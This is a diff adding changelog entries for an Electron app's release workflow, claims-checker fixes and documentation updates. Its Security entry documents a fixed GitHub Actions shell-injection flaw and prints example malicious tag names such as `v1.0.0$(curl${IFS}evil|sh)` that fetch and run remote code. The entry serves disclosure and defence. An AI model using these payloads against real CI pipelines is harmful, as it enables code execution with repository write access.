@@ -14,6 +14,174 @@ from so a reader can check it.
 
 ## [Unreleased]
 
+### Fixed
+
+- **Second review round on PR #233 found three more real issues, all fixed in the
+  same PR.**
+  - **`release.yml`'s draft-creation step was not safely re-runnable.** `gh release
+    create` has no upsert: a run that created the draft and then failed on one of
+    the two upload steps (a transient network error, say) would leave a stray
+    draft that made every retry fail with "release already exists", with no
+    documented recovery. Found by `claude[bot]`'s review. Fixed by checking `gh
+    release view "$TAG_NAME" --repo "$REPO"` first and only creating the draft if
+    it does not already exist; the two upload steps were already `--clobber`-safe
+    to repeat. Documented in `docs/RELEASE.md` §2.4.
+  - **`docs/INSTALL.md` §5 and `docs/RELEASE.md`'s opening line were stale**,
+    falsified by this same PR's own item 2 (the `publish: { provider: github }`
+    block) without being updated in the commit that made them false — CLAUDE.md
+    rule 3. `INSTALL.md` said "the update feed is not live yet" and named a
+    nonexistent `publish` block as the reason; `RELEASE.md`'s first sentence said
+    "the update feed host is not provisioned." Both rewritten to the true state:
+    the feed is configured (D-34/D-43) but has never been exercised, because no
+    release has ever been published — Step 9's job, not this PR's.
+  - **The pre-existing `docs/claims.json` row C-36 pinned an exact sentence from
+    `INSTALL.md`** ("The update feed is not live yet") that the fix above changed,
+    which would otherwise have gone from a true claim to a false one still marked
+    proven. `scripts/claims/checks/step7-docs.mjs`'s `install_feed_not_live` key
+    and C-36's `box` text were updated to match the new, equally honest sentence
+    ("a packaged build's real update check still fails today") rather than
+    loosened or dropped.
+  - Also found in this round, filed rather than fixed here (CLAUDE.md rule 7):
+    most of C-50/C-51/C-52/C-53's `expect` keys, and a pre-existing pattern in
+    older rows (C-44 through C-48), are never independently exercised by their
+    row's one mutation probe when a check emits several keys — the same failure
+    class as the `upload_order_correct` bug below, generalized (C-50 itself: 4 of
+    its 5 keys are untouched by its one probe, which only flips the provider
+    string). This is a claims-register
+    schema question (how many probes a row may declare), not a one-line fix; filed
+    as issue #234 with the reviewer's own evidence.
+
+### Security
+
+- **Shell-injection via an untrusted git tag name in `.github/workflows/release.yml`,
+  never released or run.** The `package-and-draft-release` job (added earlier in this
+  same PR, #233) spliced `${{ github.ref_name }}` and `${{ github.repository }}`
+  directly into three `run:` shell strings, in a job holding `permissions: contents:
+  write` and an ambient `GH_TOKEN`. GitHub Actions substitutes a `${{ ... }}`
+  expression into the YAML text *before* bash parses it, so the surrounding double
+  quotes gave no protection, and a git tag name may legally contain `$()`, backticks,
+  `;` and `"` (git only forbids space, `~^:?*[\`, control characters and a few
+  structural sequences — a literal space is the one that matters here). A tag
+  matching this workflow's `v*` trigger, such as `v1.0.0$(curl${IFS}evil|sh)` (`${IFS}`
+  standing in for the literal space git's own ref-name rule forbids), would have had
+  its command substitution executed by bash on the `windows-latest` runner, with
+  write access to the repository. Found independently by `claude[bot]`'s automated
+  review of PR #233 and confirmed by the cloud reviewer routine, which validated the
+  general shape (`$()`/backtick/`;` refs without spaces) against `git
+  check-ref-format --allow-onelevel`. **Correction (this entry, rule 9):** an earlier
+  revision of this sentence and of `release.yml`'s own comment illustrated the exploit
+  with `v1.0.0$(curl attacker|bash)` (confirmed invalid with `git
+  check-ref-format --allow-onelevel` exiting 1 due to the space). A valid
+  example would be `v1.0.0$(id)` (confirmed valid: `git
+  check-ref-format --allow-onelevel 'v1.0.0$(id)'` exits 0) — not the original,
+  invalid string either reviewer actually validated against. Found by a later `claude[bot]` pass on this
+  same PR; the vulnerability and the fix below were never in question, only this one
+  illustrative example. Fixed by passing `ref_name`/`repository` through
+  `env:` (`TAG_NAME`/`REPO`) and referencing the shell variables instead of the
+  template expressions — a variable's value is never re-parsed as shell syntax, unlike
+  text spliced into the script before bash sees it. **Failure mode (rule 10):** the
+  `GH_TOKEN` line in each of these steps already went through `env:`, and copying that
+  pattern to the two other values that needed it was a one-line change per step — the
+  script was written by interpolating the *readable* values (tag, repo name) directly
+  because they read as inert strings, while the actual GitHub Actions security rule is
+  "any `${{ }}` expression that reaches a `run:` shell string is untrusted input",
+  independent of what the value looks like. `release.yml` has never run (no tag has
+  been pushed), so nothing was ever exposed to this.
+
+### Fixed
+
+- **`scripts/claims/checks/release-workflow.mjs`'s `upload_order_correct` key was
+  vacuous: it always evaluated true, regardless of the real upload order in
+  `.github/workflows/release.yml`.** `idxInstallerFiles` (a `.test()` boolean) was
+  compared with `>` against `idxLatestFile` (a `string.indexOf()` number); `true`/`false`
+  coerce to `1`/`0`, so the comparison silently reduced to `idxLatestFile > 1`, true for
+  almost any non-trivial step content. Found by `claude[bot]`'s automated review of PR
+  #233 (review comment on `scripts/claims/checks/release-workflow.mjs:31`), traced
+  through by hand with the upload order reversed to confirm the check stayed green
+  either way, then fixed: the script now indexes the package job's steps as an array and
+  compares step *positions*, never a boolean against a number. **Failure mode (rule
+  10):** two unrelated JavaScript values (a regex-test boolean and a string-index
+  number) were compared with `>` without either side being cast or asserted as a
+  number first, and nothing forced that assertion — TypeScript's structural typing over
+  a dynamically-`JSON.parse`d YAML tree does not catch it, because both operands of `>`
+  are already loosely typed as `any`/`unknown` by that point in the script. C-51's own
+  register row (`docs/claims.json`) is itself the second half of the failure: its probe
+  only mutated the tag trigger, so no mutation ever exercised `upload_order_correct`
+  before this — a passing register row is not evidence for the specific `expect` key
+  nothing has ever probed (CLAUDE.md rule 4b). The probe now swaps which
+  `gh release upload` step carries the installer/blockmap vs. the update manifest. This
+  is confirmed by `scripts/__tests__/claims-prove.test.mjs`'s generic per-row subtest
+  (line 241: `` it(`${row.id} passes here, and its probe "${row.probe.name}" turns it
+  red`, ...) ``, run for C-51, passing above) — not cited with a `*Test:*` marker here
+  because its title interpolates `row.probe.name`, a multi-word value, which
+  `scripts/check-citations.mjs`'s own documented limits (`patternFor`) say is
+  permanently out of reach for that checker to resolve; narrowing the claim to the
+  file and line instead of a title it cannot check. The workflow file itself
+  (`.github/workflows/release.yml`) was never wrong; only the proof that it stays right
+  was broken.
+
+### Documentation
+
+- **Step 8 (release engineering), items 2-5: `provider: github` landed, a
+  `release.yml` publishing lane was added, and the update-integrity risk D-34
+  already accepted is now written where a reader will find it**
+  (`docs/plans/v1-production.md` lines 185-188).
+  - **Item 2.** `electron-builder.yml` gained `publish: { provider: github, owner:
+    LEAPWare-Software, repo: LEAPWare-ShellUX }`, replacing the absent `publish`
+    block the earlier `updates.leapware.dev` finding left behind. `DOCUMENTED_ENDPOINTS`
+    in `scripts/check-portability.mjs` **stays empty** — its comment was rewritten to
+    say why: `hardcoded-hostname` only matches an `https?://` literal, and a
+    GitHub-provider `publish` block is two identifiers, not a URL, so it introduces
+    none. The plan item's "both gates must go red, then green" does not hold under
+    the route actually taken (D-34's `provider: github`, not the `provider: generic`
+    route the item was written against) — forcing a red/green cycle would have meant
+    inventing a hostname finding that does not exist, which CLAUDE.md rules 2 and 4b
+    both forbid. A real fixture was added instead: *Test:*
+    `scripts/__tests__/check-portability.test.mjs` — "reports nothing for an
+    electron-builder.yml publish block using the GitHub provider, because owner/repo
+    are not a hostname literal". `npm run check:portability` passes on the real tree
+    (429 tracked files, 0 violations).
+  - **Item 3.** New `.github/workflows/release.yml`: a `verify` job (ubuntu-latest,
+    `npm run verify`) gates a `windows-latest` `package-and-draft-release` job
+    (D-26: Windows only), which runs `npm run verify:desktop`, creates a **draft**
+    GitHub Release via `gh release create --draft`, then uploads the installer and
+    `.blockmap` in one step and `latest.yml` in a separate, later step (RELEASE.md
+    §2.4's ordering). Publishing the draft is left to a human. `.github/workflows/desktop.yml`
+    is unchanged: still tag/dispatch-triggered, still `--publish never`, still
+    building both `windows-latest` and `macos-latest` as a **CI build** — the macOS
+    leg is removed from release *publishing* only, not from CI, and both workflows
+    can run from the same tag without depending on each other.
+  - **Item 4.** `SECURITY.md` gained an "Update integrity is a guardrail, not an
+    integrity control" section, and `docs/RELEASE.md` §0 gained a matching table row:
+    both name `sha512` + HTTPS + control of the `LEAPWare-Software` GitHub account as
+    what update integrity now rests on, quote D-34's own risk language, and use
+    "guardrail" precisely per `CLAUDE.md`'s vocabulary section. Per ADR-0001 Amendment
+    G, the claim is not backed by a fabricated automated test title — no test in this
+    repository drives a real network update — and instead names what actually
+    verifies it: the manual "an old build updates itself" checklist item in
+    `docs/RELEASE.md` §3.
+  - **Item 5.** `docs/RELEASE.md` §0 and §1 rewritten in this same commit: §0's
+    update-feed row no longer calls the host "not provisioned" (it names D-34's
+    `provider: github` and repo visibility, D-43, with the `gh api ... --jq
+    .visibility` → `public` check restated); §1's "decide where updates come from"
+    and "decide the repository's visibility" items are now recorded done and cite
+    D-34/D-43, and the "replace the placeholder host in exactly three places" item
+    is rewritten to explain the route actually taken and why it adds no hostname.
+    §2.2-2.4 were also touched (beyond the plan item's literal scope) so the tag,
+    upload-order and macOS checklist entries do not contradict the new `release.yml`
+    in the same commit that added it (CLAUDE.md rule 3).
+
+  Four new `docs/claims.json` register rows — **C-50**, **C-51**, **C-52**, **C-53**
+  — each with a check script under `scripts/claims/checks/` and a mutation probe,
+  prove these four items; `node --test scripts/__tests__/claims-prove.test.mjs`
+  passes all 51 assertions including each new row's probe. **Not done in this
+  change, and left unchecked on purpose:** Step 8 item 1 (the application icon)
+  needs a packaged Electron build to observe the fixed `default Electron icon is
+  used` log line, which is not doable in the cloud VM this work was done from; item
+  6 (bumping to `1.0.0-rc.1`) is held because issues #211, #213 and #214 are open
+  owner questions and gate 4's approval scope (#189) is unsettled, so declaring an
+  RC now would overclaim readiness.
+
 ### Security
 
 - **`claude-code-review.yml`: the reviewed SHA could go stale mid-run, and the
